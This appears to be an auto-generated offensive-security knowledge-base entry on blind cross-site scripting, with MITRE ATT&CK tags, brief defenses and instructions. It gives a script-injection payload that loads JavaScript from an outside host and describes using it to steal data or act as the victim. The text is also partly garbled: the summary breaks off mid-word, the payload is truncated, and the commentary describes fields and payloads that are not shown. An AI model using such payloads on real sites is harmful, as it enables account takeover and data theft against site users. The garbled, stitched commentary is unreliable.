---
id: 7b99629b-ac3c-478f-ab91-7d0f539d1e0b
name: Blind XSS Hunting with XSS Payloads
type: procedure
verified: false
submitted: false
created_at: '2023-04-06T03:56:42.204154+00:00'
updated_at: '2023-04-10T20:21:54.431010+00:00'
tactics:
- '[[Defense Evasion|TA0005 - Defense Evasion]]'
- '[[Execution|TA0002 - Execution]]'
- '[[Initial Access|TA0001 - Initial Access]]'
techniques:
- '[[Exploit Public-Facing Application|T1190 - Exploit Public-Facing Application]]'
- '[[Scripting|T1064 - Scripting]]'
tags:
- '[[Blind XSS]]'
- '[[Cross Site Scripting]]'
- '[[XSS Hunter]]'
---

# Blind XSS Hunting with XSS Payloads

## Summary

Blind Cross-Site Scripting (XSS) is an attack where the attacker is unable to directly see the results of their injected script, making it difficult to confirm whether the attack was successful or not. However, by using XSS payloads, an attacker can detect whether a vulnerability exists and then us

## Description

# Description

Blind Cross-Site Scripting (XSS) is an attack where the attacker is unable to directly see the results of their injected script, making it difficult to confirm whether the attack was successful or not. However, by using XSS payloads, an attacker can detect whether a vulnerability exists and then use this information to launch a more targeted attack. The technical explanation involves injecting a script into a web page that is then executed by the victim's browser, allowing the attacker to steal sensitive information or perform actions on behalf of the victim. The business value of this attack is that it can lead to the compromise of user credentials, sensitive data leakage, or even the complete takeover of a web application.

## Requirements

1. Access to the target web application

1. Knowledge of XSS payloads

1. A web browser

## Defense

1. Implement input validation and sanitization to prevent XSS attacks

1. Use Content Security Policy (CSP) to restrict the sources of executable scripts

1. Regularly scan web applications for vulnerabilities using automated tools

## Objectives

1. Identify whether a web application is vulnerable to Blind XSS

1. Confirm the presence of a Blind XSS vulnerability using XSS payloads

1. Use the Blind XSS vulnerability to steal sensitive information or perform actions on behalf of the victim

# Instructions

1. To use these payloads, insert them into input fields or other vulnerable areas of a web application. The payloads are designed to execute JavaScript code in the context of the victim's browser, allowing an attacker to steal sensitive information or perform actions on behalf of the victim.

**Code**: [["><script src="https://js.rip/<custom.name>"></scr]]

> The 'data' field contains multiple XSS payloads that can be used to test the security of web applications. These payloads exploit various vulnerabilities in input validation and output encoding to inject malicious JavaScript code into a web page. The 'custom.name' and 'custom.subdomain' parameters can be replaced with values specific to the target application to customize the payloads and evade detection. The 'lang' field specifies that the payloads are written in XML format, which can be used in certain contexts to bypass input filters. The 'text' field provides additional information about the deprecated XSS Hunter tool and a link to its former website. 

## MITRE ATT&CK Mapping

### Tactics

- [[Defense Evasion|TA0005 - Defense Evasion]]
- [[Execution|TA0002 - Execution]]
- [[Initial Access|TA0001 - Initial Access]]

### Techniques

- [[Exploit Public-Facing Application|T1190 - Exploit Public-Facing Application]]
- [[Scripting|T1064 - Scripting]]

## Tags

- [[Blind XSS]]
- [[Cross Site Scripting]]
- [[XSS Hunter]]
